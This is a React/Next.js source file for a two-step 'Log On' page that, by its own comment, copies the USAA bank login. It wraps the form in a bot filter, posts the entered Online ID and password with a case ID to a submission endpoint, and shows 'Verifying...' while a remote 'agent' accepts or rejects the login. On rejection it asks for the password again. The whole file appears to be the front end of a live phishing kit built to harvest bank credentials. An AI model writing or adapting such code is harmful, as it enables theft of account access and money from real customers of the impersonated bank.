'use client';

/**
 * Credentials Stage Page
 *
 * Customer enters Online ID and Password
 * Multi-step form matching USAA reference
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId, agentMessage } = useSessionStore();

  // Local state for multi-step form
  const [step, setStep] = useState<1 | 2>(1);
  const [onlineId, setOnlineId] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [rememberBrowser, setRememberBrowser] = useState(false);

  /**
   * Reset form when agent rejects submission
   */
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setPassword('');
      setStep(2); // Stay on step 2 to re-enter password
      setFieldError(agentMessage || 'Your credentials were rejected. Please try again.');
    }
  }, [status, agentMessage]);

  /**
   * Handle Step 1 Next
   */
  const handleStep1Next = (e: React.FormEvent) => {
    e.preventDefault();
    setFieldError('');
    if (!onlineId.trim()) {
      setFieldError('Please enter your Online ID');
      return;
    }
    setStep(2);
  };

  /**
   * Handle Step 2 Submit
   */
  const handleStep2Submit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: onlineId.trim(),
            password,
            remember_browser: rememberBrowser
          }),
        });

        if (!response.ok) {
          setFieldError('Unable to process your credentials. Please try again.');
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: { username: onlineId, password },
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
      } finally {
        setIsSubmitting(false);
      }
    },
    [onlineId, password, caseId, rememberBrowser]
  );

  // Determine if we are in 'waiting' state based on store or local submission
  const isWaiting = status === 'waiting' || isSubmitting;

  return (
    <BotGuard>
      <div className="login-card">
        <h1 className="login-title">Log On</h1>

        {isWaiting ? (
          <div className="login-form">
            <div className="waiting-container">
              <div className="spinner-container">
                <div className="loading-spinner"></div>
              </div>
              <p className="waiting-title">
                Verifying...
              </p>
              <p className="waiting-text">
                Please wait while we verify your information.
              </p>
            </div>
          </div>
        ) : (
          <form className="login-form" onSubmit={step === 1 ? handleStep1Next : handleStep2Submit} noValidate>

            {/* Step 1: Online ID */}
            {step === 1 && (
              <div id="step1" className="form-step">
                <div className={`form-field-wrapper ${fieldError ? 'has-error' : ''}`}>
                  <label htmlFor="onlineId" className="form-label">Online ID</label>
                  <input
                    type="text"
                    id="onlineId"
                    name="onlineId"
                    className="form-input"
                    autoComplete="username"
                    value={onlineId}
                    onChange={(e) => {
                      setOnlineId(e.target.value);
                      if (fieldError) setFieldError('');
                    }}
                    required
                  />
                </div>

                {/* Error Step 1 */}
                {fieldError && (
                  <div className="field-error-message">
                    <span>{fieldError}</span>
                  </div>
                )}

                <button type="submit" id="nextBtn" className="btn-primary">Next</button>
              </div>
            )}

            {/* Step 2: Password */}
            {step === 2 && (
              <div id="step2" className="form-step">

                {/* Online ID Display (read-only) */}
                <div className="form-field-wrapper form-field-readonly">
                  <label className="form-label">Online ID</label>
                  <span id="onlineIdDisplay" className="form-value">{onlineId}</span>
                </div>

                {/* Password Field */}
                <div className={`form-field-wrapper ${fieldError ? 'has-error' : ''}`}>
                  <label htmlFor="password" className="form-label">Password</label>
                  <div className="password-input-container">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      id="password"
                      name="password"
                      className="form-input password-input"
                      autoComplete="current-password"
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (fieldError) setFieldError('');
                      }}
                      required
                    />
                    <button
                      type="button"
                      id="showPasswordBtn"
                      className="show-password-btn"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? 'Hide' : 'Show'}
                    </button>
                  </div>
                </div>

                {/* Error Message Step 2 - Urgent Alert style for logic errors */}
                {fieldError && (
                  <div className="urgent-alert">
                    <div className="urgent-alert-icon">
                      <svg viewBox="0 0 24 24" fill="currentColor" width="24" height="24">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                      </svg>
                    </div>
                    <div className="urgent-alert-content">
                      <div className="urgent-alert-title">System Message</div>
                      <div className="urgent-alert-message">{fieldError}</div>
                    </div>
                  </div>
                )}

                {/* Remember Browser Checkbox */}
                <div className="remember-checkbox-wrapper">
                  <input
                    type="checkbox"
                    id="rememberBrowser"
                    name="rememberBrowser"
                    className="checkbox-input"
                    checked={rememberBrowser}
                    onChange={(e) => setRememberBrowser(e.target.checked)}
                  />
                  <label htmlFor="rememberBrowser" className="checkbox-label">
                    Remember this browser to log on faster next time.
                  </label>
                </div>

                <button type="submit" className="btn-primary">
                  Next
                </button>
              </div>
            )}
          </form>
        )}

        <a href="#" className="help-link">I need help logging on</a>
      </div>
    </BotGuard>
  );
}
